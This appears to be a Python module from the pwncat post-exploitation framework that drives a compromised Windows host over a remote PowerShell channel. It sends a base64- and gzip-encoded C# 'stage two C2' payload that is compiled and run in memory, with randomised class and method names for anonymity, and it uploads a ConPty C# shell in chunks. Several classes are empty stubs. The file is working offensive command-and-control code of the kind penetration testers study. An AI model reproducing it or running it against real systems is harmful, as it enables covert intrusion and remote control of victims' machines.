#!/usr/bin/env python3
from io import TextIOWrapper, BufferedIOBase, UnsupportedOperation
from typing import List
from io import StringIO, BytesIO
import textwrap
import pkg_resources
import pathlib
import base64
import time
import gzip
import os

import pwncat
import pwncat.subprocess
import pwncat.util
from pwncat.platform import Platform, PlatformError, Path


class PopenWindows(pwncat.subprocess.Popen):
    """
    Windows-specific Popen wrapper class
    """

    def __init__(
        self,
        platform: Platform,
        args,
        stdout,
        stdin,
        text,
        encoding,
        errors,
        bufsize,
        start_delim: bytes,
        end_delim: bytes,
        code_delim: bytes,
    ):
        super().__init__()


class WindowsReader(BufferedIOBase):
    """
    A file-like object which wraps a Popen object to enable reading a
    remote file.
    """


class WindowsWriter(BufferedIOBase):
    """A wrapper around an active Popen object which is writing to
    a file. Remote files are not seekable, and cannot be simultaneous
    read/write."""


class Windows(Platform):
    """Concrete platform class abstracting interaction with a Windows/
    Powershell remote host. The remote windows host must support
    powershell for this platform to function, and the channel must be
    established with an open powershell session."""

    PATH_TYPE = pathlib.PureWindowsPath
    LIBRARY_IMPORTS = {
        "Kernel32": [
            "IntPtr GetStdHandle(int nStdHandle)",
            "bool GetConsoleMode(IntPtr hConsoleHandle, out uint lpMode)",
            "bool SetConsoleMode(IntPtr hConsoleHandle, uint lpMode)",
        ]
    }

    def __init__(
        self,
        session: "pwncat.session.Session",
        channel: pwncat.channel.Channel,
        log: str = None,
    ):
        super().__init__(session, channel, log)

        self.name = "windows"

        # Initialize interactive tracking
        self._interactive = False

        # Ensure history is disabled (this does not help logging!)
        # self.disable_history()

        # Most Windows connections aren't capable of a PTY, and checking
        # is difficult this early. We will assume there isn't one.
        self.has_pty = True

        # Trigger allocation of a pty. Because of powershell and windows
        # being unpredictable and weird, we basically *need* this. So,
        # we trigger it initially. WinAPI is available everywhere so on
        # any relatively recent version of windows, this should be fine.
        # self.get_pty()

        self._bootstrap_stage_two()

        # Load requested libraries
        # for library, methods in self.LIBRARY_IMPORTS.items():
        #     self._load_library(library, methods)

    def _bootstrap_stage_two(self):
        """This takes the stage one C2 (powershell) and boostraps it for stage
        two. Stage two is C# code dynamically compiled and executed. We first
        execute a small C# payload from Powershell which then infinitely accepts
        more C# to be executed. Further payloads are separated by the delimeters:

        - "/* START CODE BLOCK */"
        - "/* END CODE BLOCK */"
        """

        # Read stage two source code
        stage_two_path = pkg_resources.resource_filename("pwncat", "data/stagetwo.cs")
        with open(stage_two_path, "rb") as filp:
            source = filp.read()

        # Randomize class and method name for a smidge of anonymity
        clazz = pwncat.util.random_string(8)
        main = pwncat.util.random_string(8)
        source = source.replace(b"class StageTwo", b"class " + clazz.encode("utf-8"))
        source = source.replace(
            b"public void main", b"public void " + main.encode("utf-8")
        )

        # compress and encode source
        source_gz = BytesIO()
        with gzip.GzipFile(fileobj=source_gz, mode="wb") as gz:
            gz.write(source)
        source_enc = base64.b64encode(source_gz.getvalue())

        # List of needed assemblies for stage two
        needed_assemblies = [
            "System.dll",
            "System.Core.dll",
            "System.Dynamic.dll",
            "Microsoft.CSharp.dll",
        ]

        # List of commands in the payload to bootstrap stage two
        payload = [
            "$cp = New-Object System.CodeDom.Compiler.CompilerParameters",
        ]

        # Add all needed assemblies to the compiler parameters
        for assembly in needed_assemblies:
            payload.append(f"""$cp.ReferencedAssemblies.Add("{assembly}")""")

        # Compile our C2 code and execute it
        payload.extend(
            [
                "$cp.GenerateExecutable = $false",
                "$cp.GenerateInMemory = $true",
                "$gzb = [System.Convert]::FromBase64String((Read-Host))",
                "$gzms = New-Object System.IO.MemoryStream -ArgumentList @(,$gzb)",
                "$gz = New-Object System.IO.Compression.GzipStream $gzms, ([IO.Compression.CompressionMode]::Decompress)",
                f"$source = New-Object byte[]({len(source)})",
                f"$gz.Read($source, 0, {len(source)})",
                "$gz.Close()",
                "$r = (New-Object Microsoft.CSharp.CSharpCodeProvider).CompileAssemblyFromSource($cp, [System.Text.Encoding]::ASCII.GetString($source))",
                f"""$r.CompiledAssembly.CreateInstance("{clazz}").{main}()""",
            ]
        )

        # Send the payload, then send the encoded and compressed code
        self.channel.send((";".join(payload)).encode("utf-8") + b"\n")
        self.channel.send(source_enc + b"\n")

        # Wait for the new C2 to be ready
        self.channel.recvuntil(b"READY")

    def _load_library(self, name: str, methods: List[str]):
        """Load the library. This adds a global with the same name as `name`
        which contains a reference to the library with all methods specified in
        `mehods` loaded."""

        name = name.encode("utf-8")
        method_def = b""

        for method in methods:
            method = method.encode("utf-8")
            # self.channel.send(
            method_def += (
                b'[DllImport(`"'
                + name
                + b'.dll`", SetLastError = true)]`npublic static extern '
                + method
                + b";`n"
            )

        command = (
            b"$"
            + name
            + b' = Add-Type -MemberDefinition "'
            + method_def
            + b"\" -Name '"
            + name
            + b"' -Namespace 'Win32' -PassThru\n"
        )
        self.channel.send(command)
        self.session.manager.log(command.decode("utf-8").strip())

    def get_pty(self):
        """ Spawn a PTY in the current shell. """

        if self.has_pty:
            return

        cols, rows = os.get_terminal_size()

        # Read the C# used to spawn a conpty
        conpty_path = pkg_resources.resource_filename("pwncat", "data/conpty.cs")
        with open(conpty_path, "rb") as filp:
            source = filp.read()

        source = source.replace(b"ROWS", str(rows).encode("utf-8"))
        source = source.replace(b"COLS", str(cols).encode("utf-8"))

        # base64 encode the source
        source = base64.b64encode(source)
        CHUNK_SZ = 1024

        # Initialize victim source variable
        self.channel.send(b'$source = ""\n')

        # Chunk the source in 64-byte pieces
        for idx in range(0, len(source), CHUNK_SZ):
            chunk = source[idx : idx + CHUNK_SZ]
            self.channel.send(b'$source = $source + "' + chunk + b'"\n')

        # decode the source
        self.channel.send(
            b"$source = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($source))\n"
        )

        # Compile and execute
        self.channel.send(
            b"\n".join(
                [
                    b"Add-Type -TypeDefinition $source -Language CSharp",
                    b'[ConPtyShellMainClass]::ConPtyShellMain(@("", 0, 24, 80, "powershell.exe")); exit',
                ]
            )
            + b"\n"
        )

        self.has_pty = True

    def get_host_hash(self):
        return "windows-testing"

    @property
    def interactive(self):
        return self._interactive

    @interactive.setter
    def interactive(self, value):

        return

        if value:

            command = (
                "".join(
                    [
                        "function global:prompt {",
                        'Write-Host -Object "(remote) " -NoNewLine -ForegroundColor Red;',
                        'Write-Host -Object "$env:UserName@$(hostname)" -NoNewLine -ForegroundColor Yellow;',
                        'Write-Host -Object ":" -NoNewLine;',
                        'Write-Host -Object "$(Get-Location)" -NoNewLine -ForegroundColor Cyan;',
                        "return '$ ';",
                        "}",
                    ]
                )
                + "\r"
            )

            self.logger.info(command.rstrip("\n"))
            self.channel.send(command.encode("utf-8"))

            return
